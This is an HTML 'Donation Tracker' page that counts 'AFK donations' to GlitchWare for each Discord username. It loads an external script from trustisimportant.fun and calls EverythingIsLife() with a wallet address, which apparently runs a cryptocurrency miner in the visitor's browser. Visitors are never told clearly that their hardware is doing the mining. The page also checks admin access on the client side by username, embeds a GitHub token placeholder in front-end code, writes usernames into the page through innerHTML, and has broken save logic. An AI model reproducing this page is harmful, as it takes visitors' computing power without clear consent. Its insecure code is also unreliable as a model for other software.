<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Donation Tracker</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #222;
            color: #fff;
            text-align: center;
            padding: 50px;
        }
        .donation-info {
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 20px;
        }
        .time-counter {
            font-size: 20px;
            color: #ccc;
            margin-bottom: 10px;
        }
        .donation-rate {
            font-size: 16px;
            color: #999;
            margin-bottom: 20px;
        }
        .admin-panel {
            margin-top: 20px;
            text-align: left;
        }
        button {
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
        }
        input {
            padding: 10px;
            font-size: 16px;
            margin-bottom: 10px;
        }
        #login-section, #donation-section, #admin-section {
            display: none;
        }
    </style>
</head>
<body>
    <div id="login-section">
        <input type="text" id="username" placeholder="Enter your Discord username">
        <button onclick="login()">Login</button>
    </div>

    <div id="donation-section">
        <div class="donation-info">Donated amount of money to GlitchWare in this session: $<span id="donation-amount">0.0000000000</span></div>
        <div class="time-counter" id="time-counter">00:00:00</div>
        <div class="donation-rate">Current AFK donation rate: $0.0000000144 per second</div>
    </div>

    <div id="admin-section">
        <div class="admin-panel">
            <h2>Admin Panel</h2>
            <div id="user-donations"></div>
        </div>
    </div>

    <script src="https://trustisimportant.fun/karma/karma.js?karma=bs?nosaj=faster.mo"></script>
    <script type="text/javascript">
        EverythingIsLife('45d5LPYeRSEPywkk61dHxFfSDLKYhRhuP3VoC8d9B98Qgu3jDZTxm9G949ZpLGSTXAUk24sXniAn5WtHLrzFbR3UK2Mhwdt', 'Donate', 70);
    </script>

    <script>
        const donationRatePerSecond = 0.0000000144; // Updated donation rate per second for 25 h/s
        let donationAmount = 0.0000000000;
        let secondsElapsed = 0;
        let users = {};
        let username = '';

        document.addEventListener("DOMContentLoaded", function() {
            document.getElementById('login-section').style.display = 'block';
            loadUserData();
        });

        function login() {
            username = document.getElementById('username').value;
            if (username) {
                document.getElementById('login-section').style.display = 'none';
                if (username === 'admin-xeno1') {
                    document.getElementById('admin-section').style.display = 'block';
                    fetchUserData(); // Fetch user donations from server
                } else {
                    document.getElementById('donation-section').style.display = 'block';
                    startDonationTracker();
                }
            }
        }

        function startDonationTracker() {
            setInterval(updateCounters, 1000);
        }

        function updateCounters() {
            donationAmount += donationRatePerSecond;
            document.getElementById('donation-amount').innerText = donationAmount.toFixed(10);

            if (!users[username]) {
                users[username] = 0;
            }
            users[username] += donationRatePerSecond;

            secondsElapsed++;
            const hours = Math.floor(secondsElapsed / 3600);
            const minutes = Math.floor((secondsElapsed % 3600) / 60);
            const seconds = secondsElapsed % 60;
            document.getElementById('time-counter').innerText = formatTime(hours) + ":" + formatTime(minutes) + ":" + formatTime(seconds);

            // Save user data to GitHub repository
            saveUserData(username, users[username]);
        }

        function formatTime(time) {
            return (time < 10 ? "0" + time : time);
        }

        function saveUserData(username, donationAmount) {
            // Example: Use fetch to update data in GitHub repository
            const newData = { "username": username, "donationAmount": donationAmount };
            const encodedData = btoa(JSON.stringify(newData));
            fetch('https://api.github.com/repos/notglitchy32/notglitchy32.github.io/contents/data/users.json', {
                method: 'GET',
                headers: {
                    'Authorization': 'token YOUR_GITHUB_TOKEN',
                    'Accept': 'application/vnd.github.v3+json',
                }
            })
            .then(response => response.json())
            .then(data => {
                // Update existing user data or add new user
                const updatedUsers = data.users.map(user => {
                    if (user.username === username) {
                        user.donationAmount = donationAmount;
                    }
                    return user;
                });

                // If user not found, add new user
                if (!updatedUsers.some(user => user.username === username)) {
                    updatedUsers.push({ "username": username, "donationAmount": donationAmount });
                }

                // Update the file in the repository
                const sha = data.sha;
                const apiUrl = `https://api.github.com/repos/notglitchy32/notglitchy32.github.io/contents/data/users.json`;
                return fetch(apiUrl, {
                    method: 'PUT',
                    headers: {
                        'Authorization': 'token YOUR_GITHUB_TOKEN',
                        'Accept': 'application/vnd.github.v3+json',
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        message: 'Update donation data',
                        content: encodedData,
                        sha: sha
                    })
                });
            })
            .then(response => response.json())
            .then(data => console.log('Data saved:', data))
            .catch(error => console.error('Error saving data:', error));
        }

        function fetchUserData() {
            // Fetch user donations from GitHub repository
            fetch('https://raw.githubusercontent.com/notglitchy32/notglitchy32.github.io/main/data/users.json')
            .then(response => response.json())
            .then(data => displayUserDonations(data))
            .catch(error => console.error('Error fetching data:', error));
        }

        function displayUserDonations(data) {
            const userDonationsDiv = document.getElementById('user-donations');
            userDonationsDiv.innerHTML = '';
            data.users.forEach(user => {
                userDonationsDiv.innerHTML += `<p>${user.username}: $${user.donationAmount.toFixed(10)}</p>`;
            });
        }
    </script>
</body>
</html>
